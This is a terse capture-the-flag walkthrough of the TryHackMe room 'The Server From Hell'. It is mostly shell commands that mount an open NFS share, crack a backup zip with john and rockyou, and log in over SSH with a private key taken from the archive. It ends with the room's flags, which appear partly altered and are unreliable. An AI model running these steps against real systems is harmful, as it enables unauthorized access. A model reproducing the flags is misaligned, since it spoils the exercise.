...
```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ telnet 10.10.13.91 1337
Trying 10.10.13.91...
...
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ telnet 10.10.13.91 12345
Trying 10.10.13.91...
Connected to 10.10.13.91.
Escape character is '^]'.
...
```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ showmount -e 10.10.13.91
Export list for 10.10.13.91:
/home/nfs *
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ mkdir /tmp/hell
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ sudo mount -t nfs 10.10.13.91:/home/nfs /tmp/hell
[sudo] password for kali:
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ ls -la /tmp/hell
total 32
...
```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ cd /tmp/hell
bibo318@parrot:/tmp/hell$ ls -la
total 32
drwxr-xr-x  2 nobody nogroup  4096 Sep 16 00:11 .
drwxrwxrwt 19 root   root    20480 Nov 14 16:55 ..
-rw-r--r--  1 root   root     4534 Sep 16 00:11 backup.zip
bibo318@parrot:/tmp/hell$ unzip backup.zip
Archive:  backup.zip
...
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ zip2john backup.zip > /home/kali/CTFs/tryhackme/The\ Server\ From\ Hell/backup.hash
...
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
...
Session completed
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ unzip backup.zip
Archive:  backup.zip
...
```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/flag.txt
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/id_rsa.pub
...
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ chmod 600 home/hades/.ssh/id_rsa
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91
kex_exchange_identification: read: Connection reset by peer
```

```
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/hint.txt
2500-4500
...
bibo318@parrot:~/CTFs/tryhackme/The Server From Hell$ ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p 3333
...
`thm{h0p3_y0u_l1k3d_th3_f1r3w4ll12**123:))}`

user.txt

`thm{sh3ll_3c4p3_15_v3ry_133712**123:))}`

root.txt

`thm{w0w_n1c3_3sc4l4t10n12**123:))}`
